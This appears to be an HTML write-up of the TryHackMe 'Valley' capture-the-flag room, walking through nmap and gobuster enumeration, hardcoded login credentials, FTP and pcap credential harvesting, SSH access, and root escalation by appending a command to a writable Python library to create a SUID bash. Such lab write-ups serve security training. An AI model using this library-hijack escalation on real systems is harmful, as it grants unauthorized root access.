@@ -1,1 +1,127 @@
-#Coming SOON!
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>The Valley - TryHackMe Walkthrough</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 20px;
+        }
+        h1, h2, h3 {
+            color: #333;
+        }
+        pre {
+            background-color: #eee;
+            padding: 10px;
+            border-left: 5px solid #333;
+            overflow-x: auto;
+        }
+        code {
+            background-color: #f0f0f0;
+            padding: 2px 4px;
+            border-radius: 4px;
+        }
+    </style>
+</head>
+<body>
+    <h1>The Valley - TryHackMe Walkthrough</h1>
+    <p>In this walkthrough, I’ll document the steps taken to complete the "Valley" room on TryHackMe.</p>
+
+    <h2>Step 1: Initial Network Scan</h2>
+    <p>First, we perform an Nmap scan to identify open ports on the target machine.</p>
+    <pre><code>nmap -sV -p- 10.10.222.194</code></pre>
+    <h3>Nmap Output:</h3>
+    <pre><code>Starting Nmap 7.94SVN (https://nmap.org) at 2024-03-16 19:07 IST
+Nmap scan report for 10.10.222.194
+Host is up (0.16s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</code></pre>
+
+    <h2>Step 2: Directory Enumeration</h2>
+    <p>Next, we use Gobuster for directory enumeration to find hidden files.</p>
+    <pre><code>gobuster dir -u http://10.10.222.194 -w /path/to/wordlist.txt</code></pre>
+    <h3>Found:</h3>
+    <p><code>note.txt</code> on <code>/pricing</code> which contains:</p>
+    <pre><code>J, Please stop leaving notes randomly on the website - RP</code></pre>
+
+    <h2>Step 3: Sub-directory Enumeration</h2>
+    <p>We check the <code>/static/</code> directory and find:</p>
+    <pre><code>/00 containing:
+dev notes from valleyDev: 
+- add wedding photo examples 
+- redo the editing on #4 
+- remove /dev1243224123123123 
+- check for SIEM alerts</code></pre>
+
+    <h2>Step 4: Login Page Exploration</h2>
+    <p>In <code>/dev1243224123123</code>, we find a login page with a JavaScript file that handles login functionality.</p>
+    <pre><code>loginButton.addEventListener("click", (e) => {
+  e.preventDefault();
+  const username = loginForm.username.value;
+  const password = loginForm.password.value;
+  if (username === "siemDev" && password === "california") {
+    window.location.href = "/dev1243224123123/devNotes37370.txt";
+  } else {
+    loginErrorMsg.style.opacity = 1;
+  }
+});</code></pre>
+    <p>After logging in, we retrieve:</p>
+    <pre><code>/devNotes37370.txt
+dev notes for ftp server:
+- stop reusing credentials 
+- check for any vulnerabilities 
+- stay up to date on patching 
+- change ftp port to normal port</code></pre>
+
+    <h2>Step 5: FTP Enumeration</h2>
+    <p>We scan for ports again, suspecting an FTP service on port <code>37370</code>. Using the credentials:</p>
+    <ul>
+        <li><strong>Username</strong>: siemDev</li>
+        <li><strong>Password</strong>: california</li>
+    </ul>
+    <p>We successfully log in and download three <code>.pcapng</code> files. Analyzing these files in Wireshark, we discover:</p>
+    <pre><code>uname=valleyDev passwd=ph0t0s1234</code></pre>
+
+    <h2>Step 6: Accessing the Target Machine via SSH</h2>
+    <p>Now we can SSH into the target machine:</p>
+    <pre><code>ssh valleyDev@10.10.222.194</code></pre>
+
+    <h2>Step 7: Running the Authenticator</h2>
+    <p>We discover the <code>valleyAuthenticator</code> binary:</p>
+    <pre><code>file valleyAuthenticator</code></pre>
+    <p>After attempting to run it:</p>
+    <pre><code>./valleyAuthenticator</code></pre>
+    <p>This prompts for the username and password.</p>
+
+    <h2>Step 8: Checking Cron Jobs</h2>
+    <p>We review the <code>/etc/crontab</code> for potential escalations:</p>
+    <pre><code>cat /etc/crontab</code></pre>
+
+    <h2>Step 9: Injecting a Payload</h2>
+    <p>Finding that <code>valley</code> can write to <code>/usr/lib/python3.8/base64.py</code>, we inject a payload to create a SUID copy of Bash:</p>
+    <pre><code>echo 'import os; os.system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash")' >> /usr/lib/python3.8/base64.py</code></pre>
+
+    <h2>Step 10: Gaining Root Access</h2>
+    <p>After executing the script, we check <code>/tmp</code>:</p>
+    <pre><code>ls -l /tmp/</code></pre>
+    <p>Finally, we run the SUID bash:</p>
+    <pre><code>/tmp/bash -p</code></pre>
+    <p>We confirm our identity:</p>
+    <pre><code>whoami
+# Output: root</code></pre>
+    <p>Retrieve the root flag:</p>
+    <pre><code>cat /root/root.txt
+# Output: THM{you found the flag}</code></pre>
+
+    <h2>Conclusion</h2>
+    <p>This walkthrough outlines the steps taken to successfully complete the "Valley" CTF challenge on TryHackMe. Through careful enumeration and exploitation of vulnerabilities, we were able to escalate our privileges and capture the root flag.</p>
+</body>
+</html>
+
